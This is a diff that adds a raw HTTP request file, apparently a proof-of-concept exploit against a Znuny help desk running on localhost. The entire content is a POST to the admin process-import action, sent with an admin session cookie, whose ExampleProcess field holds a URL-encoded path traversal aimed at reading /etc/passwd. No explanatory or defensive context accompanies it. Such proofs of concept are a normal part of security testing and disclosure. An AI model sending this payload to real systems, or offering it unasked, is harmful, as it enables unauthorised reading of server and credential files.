@@ -1,0 +1,6 @@
+POST /znuny/index.pl HTTP/1.1
+Host: localhost:25114
+Cookie: OTRSAgentInterface=<admin-session>
+Content-Type: application/x-www-form-urlencoded
+
+Action=AdminProcessManagement&Subaction=ProcessImport&ChallengeToken=c35YlffbHxhcQWte5y4i5BCGiEma7Ke1&ExampleProcess=%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
